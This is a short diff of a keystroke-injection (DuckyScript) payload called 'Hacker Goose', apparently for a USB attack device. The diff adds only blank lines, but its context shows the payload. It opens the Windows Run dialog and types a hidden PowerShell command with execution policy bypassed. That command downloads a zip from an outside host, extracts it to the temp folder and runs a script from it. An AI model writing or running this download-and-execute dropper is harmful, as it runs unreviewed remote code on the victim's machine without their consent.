@@ -1,3 +1,4 @@
+
 REM     Title: Hacker Goose
 
 REM     Author: I am Jakoby
@@ -10,3 +11,4 @@ GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
 ENTER
+
